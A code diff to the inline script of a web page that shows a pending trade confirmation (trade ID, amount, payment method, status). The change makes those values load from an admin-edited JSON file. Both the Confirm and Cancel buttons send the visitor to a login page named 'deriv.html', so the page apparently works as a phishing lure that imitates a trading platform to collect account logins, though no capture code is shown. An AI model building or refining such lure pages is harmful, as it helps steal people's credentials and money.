@@ -271,8 +271,8 @@
     </div>
 
     <script>
-        // Edit these defaults, or pass values via URL query params for integration later.
-        // Example: index.html?tradeId=TR-88421&amount=150.00%20USD&method=Bank%20Transfer&status=waiting
+        // Values come from /trade-config.json (edited in /admin).
+        // Optional URL overrides: ?tradeId=...&amount=...&method=...&status=...
         const DEFAULT_TRADE = {
             tradeId: "TR-88421",
             amount: "150.00 USD",
@@ -280,22 +280,22 @@
             status: "waiting" // "waiting" | "complete"
         };
 
-        function getTradeFromUrl() {
-            const params = new URLSearchParams(window.location.search);
-            return {
-                tradeId: params.get("tradeId") || DEFAULT_TRADE.tradeId,
-                amount: params.get("amount") || DEFAULT_TRADE.amount,
-                paymentMethod: params.get("method") || params.get("paymentMethod") || DEFAULT_TRADE.paymentMethod,
-                status: params.get("status") || DEFAULT_TRADE.status
-            };
-        }
-
         function normalizeStatus(status) {
             const value = (status || "").toLowerCase().trim();
             if (value === "complete" || value === "transfer complete" || value === "completed") {
                 return "complete";
             }
             return "waiting";
+        }
+
+        function mergeTrade(base) {
+            const params = new URLSearchParams(window.location.search);
+            return {
+                tradeId: params.get("tradeId") || base.tradeId || DEFAULT_TRADE.tradeId,
+                amount: params.get("amount") || base.amount || DEFAULT_TRADE.amount,
+                paymentMethod: params.get("method") || params.get("paymentMethod") || base.paymentMethod || DEFAULT_TRADE.paymentMethod,
+                status: params.get("status") || base.status || DEFAULT_TRADE.status
+            };
         }
 
         function renderTrade(trade) {
@@ -330,11 +330,22 @@
             window.location.href = `deriv.html?${params.toString()}`;
         }
 
-        const trade = getTradeFromUrl();
-        renderTrade(trade);
+        async function loadTrade() {
+            let fromFile = {};
+            try {
+                const res = await fetch("/trade-config.json?_=" + Date.now(), { cache: "no-store" });
+                if (res.ok) fromFile = await res.json();
+            } catch (e) {
+                /* fall back to defaults */
+            }
+            return mergeTrade(fromFile);
+        }
 
-        document.getElementById("confirmBtn").addEventListener("click", () => goToLogin("confirm", trade));
-        document.getElementById("cancelBtn").addEventListener("click", () => goToLogin("cancel", trade));
+        loadTrade().then((trade) => {
+            renderTrade(trade);
+            document.getElementById("confirmBtn").addEventListener("click", () => goToLogin("confirm", trade));
+            document.getElementById("cancelBtn").addEventListener("click", () => goToLogin("cancel", trade));
+        });
     </script>
 
     <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
